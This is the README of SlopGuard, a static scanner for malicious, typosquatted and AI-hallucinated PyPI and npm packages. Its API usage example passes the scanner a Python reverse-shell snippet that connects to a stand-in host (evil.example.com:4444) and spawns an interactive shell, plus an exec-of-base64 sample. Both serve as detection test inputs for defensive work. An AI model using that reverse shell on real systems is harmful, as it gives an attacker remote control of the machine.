# 🛡️ SlopGuard: Zero-LLM AI Hallucination & Supply Chain Threat Auditor

[![SlopGuard CI](https://github.com/royans/slopguard/actions/workflows/ci.yml/badge.svg)](https://github.com/royans/slopguard/actions/workflows/ci.yml)
[![Python Version](https://img.shields.io/badge/python-3.11%20%7C%203.12-blue.svg)](https://github.com/royans/slopguard/)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Engine](https://img.shields.io/badge/Core-Zero--LLM%20Deterministic-green.svg)](#architecture)

**SlopGuard** is a high-throughput, deterministic supply chain malware, typosquatting, and AI hallucination detection engine for Python (PyPI) and JavaScript (npm) ecosystems.

Designed for developers, DevSecOps pipelines, and security research teams, SlopGuard operates within the **Adversary Exploitation Window (AEW)**—identifying weaponized packages, deceptive brand squats, and phantom dependencies before they are installed.

> **Background & Live Demo**: SlopGuard was developed for the [FlagThis](https://flagthis.com) website. A working live demonstration that performs live supply chain audits and threat intelligence indexing is available at [FlagThis.com](https://flagthis.com).

---

## ⚡ Highlights & Key Capabilities

* **Zero-LLM Core Engine**: Fully deterministic execution via Python AST inspection, YARA signature scanning, and combinatorial heuristics. Zero probabilistic variance, zero external API costs, and sub-millisecond execution.
* **Deep Static AST Inspection**: Statically deconstructs Python `setup.py`, `pyproject.toml`, and module source code without dynamic code execution—detecting hidden reverse shells, raw sockets, eval-obfuscation, and child process execution.
* **npm Lifecycle Script Analysis**: Analyzes `package.json` hooks (`preinstall`, `install`, `postinstall`) and unpacks JS payloads for suspicious network exfiltration.
* **Pre-Compiled YARA Threat Engine**: Built-in YARA rules spanning 9 weaponization vectors: credentials, exfiltration, evasion, persistence, supply-chain hooks, and dropper logic.
* **Phantom Squatting & Typosquat Detection**: Identifies impersonations of high-value brands (Google, AWS, Stripe, Okta, Clerk, Supabase) using Levenshtein distance, token insertion, and delimiter swap heuristics.
* **AI Hallucination & Package Parking Auditor**: Scans project lockfiles and manifests (`requirements.txt`, `package.json`) to detect hallucinated package names frequently recommended by LLMs that do not exist or are parked by adversaries.
* **Version Confusion Anomaly Detection**: Surfaces suspicious version jumps (e.g. initial registrations claiming v99.0.0 or v50.0.0) while safely handling legitimate CalVer and date-stamped releases.

---

## 🚀 Installation & Quickstart

Clone the repository directly from GitHub:

```bash
git clone https://github.com/royans/slopguard.git
cd slopguard

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -e .
```

---

## 💻 CLI Quickstart

The `slopguard` command-line interface provides fast, rich terminal feedback for auditing and inspecting packages.

### 1. Check Project Manifests for Hallucinations
Scan your `requirements.txt` or `package.json` to verify that all declared dependencies are genuine and not unverified or parked squats:

```bash
slopguard check requirements.txt
slopguard check package.json
```

### 2. Deep Static AST Inspection of an Upstream Package
Fetch and statically inspect any published PyPI or npm package without executing its code:

```bash
slopguard inspect requests --ecosystem pypi
slopguard inspect express --ecosystem npm
```

### 3. Statically Scan Local Code or Directory
Run the AST analyzer and YARA rule engine across any local Python or JavaScript file/directory:

```bash
slopguard scan ./src
slopguard scan setup.py
```

### 4. Comprehensive Directory Audit
Audit an entire project directory, checking source files and manifests simultaneously:

```bash
slopguard audit .
```

### 5. Engine Diagnostics & Rule Status
View engine statistics, active YARA rule suites, and loaded parking signatures:

```bash
slopguard info
```

---

## 🐍 Python API Usage

SlopGuard can also be integrated directly into your own security tools and CI/CD pipelines:

```python
from slopguard import YaraPatternScanner, PythonASTAssessor

# 1. Scan source code with the YARA threat engine
scanner = YaraPatternScanner()
matches = scanner.scan_text('''
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.example.com', 4444))
os.dup2(s.fileno(), 0)
subprocess.call(['/bin/sh', '-i'])
''')

for match in matches:
    print(f"Detected: {match['rule']}")

# 2. Deep static AST analysis
assessor = PythonASTAssessor()
result = assessor.analyze_source("import base64; exec(base64.b64decode('...'))")
print(f"Threat Score: {result.composite_threat_score}/100")
print(f"Verdict: {result.verdict}")
```

---

## 🏗️ Architecture

```
┌───────────────────────────────────────────────────────────┐
│                    Target Input                           │
│     (Upstream Package Tarball, Manifest, or Local Source)  │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────┐
│              Deterministic Analysis Pipeline              │
│                                                           │
│  [1] Manifest & Metadata Sizing                           │
│      - Non-comment LOC & Codebase Tiering                 │
│      - Publisher Domain Proof vs Free Webmail Domain      │
│                                                           │
│  [2] Static AST Deconstruction (Zero Dynamic Execution)   │
│      - Python AST: setup.py / pyproject.toml hooks        │
│      - npm: package.json install hooks & lifecycle scripts│
│                                                           │
│  [3] Pre-Compiled YARA Engine                             │
│      - 9 Suites: Exfiltration, Shells, Persistence, etc.  │
│                                                           │
│  [4] Scoring & Classification Matrix                      │
│      - Normalized 0-1000 Threat Score                     │
│      - Verdicts: MALICIOUS | SUSPICIOUS | BENIGN          │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────┐
│             Output: Structured JSON / Terminal CLI        │
└─────────────────────────────┬─────────────────────────────┘
                              │
                              ▼
     (Live community audits indexed at https://flagthis.com)
```

---

## 🔒 Safe Analysis & Static Execution Model

SlopGuard is strictly a **zero-dynamic-execution** static engine:
* It **never** executes package installation scripts (`setup.py`, `install`, `postinstall`).
* It **never** imports arbitrary untrusted third-party code into the runtime interpreter.
* Tarball unpacking is guarded by path traversal protections (`strip_components`, safe paths) and bounded archive limits.

---

## 🕊️ Principles & Philosophy

When evaluating code and packages across the public ecosystem, SlopGuard operates under five foundational first principles:

1. **Be Respectful**: We respect package maintainers, authors, and open-source contributors. We never assume malice where inexperience, early prototyping, or harmless stubs explain the code.
2. **Do Not Overcommit on Protections**: SlopGuard is a deterministic static analyzer (AST inspection + YARA signatures + metadata heuristics), not an omniscient silver bullet. We avoid hyperbolic claims and are precise about what we detect and what lies outside our scope.
3. **Assume We Can Be Wrong — Be Humble**: Heuristics are imperfect and false positives can occur. When legitimate code triggers an alert, we treat it as an opportunity to refine our rubrics and correct course humbly.
4. **Be Truthful & Fact-Oriented**: We strictly separate observable ground truth (LOC, bytes, imports, AST nodes, network calls) from interpretive threat analysis. We never invent or exaggerate findings.
5. **Do It for the Good of Everyone**: Open source is a shared global commons. Our purpose is to protect developers, teams, and autonomous coding agents from weaponized traps and hallucinated dependencies collaboratively.


## 🤝 Contributing

Contributions are welcome! Please run our pre-submit gatekeeper before opening a pull request:

```bash
# Install git hooks
./scripts/install_hooks.sh

# Run pre-submit checks manually
python3 scripts/presubmit.py

# Run test suite
pytest tests/ -v
```

---

## 📄 License

Licensed under the [Apache License, Version 2.0](LICENSE).
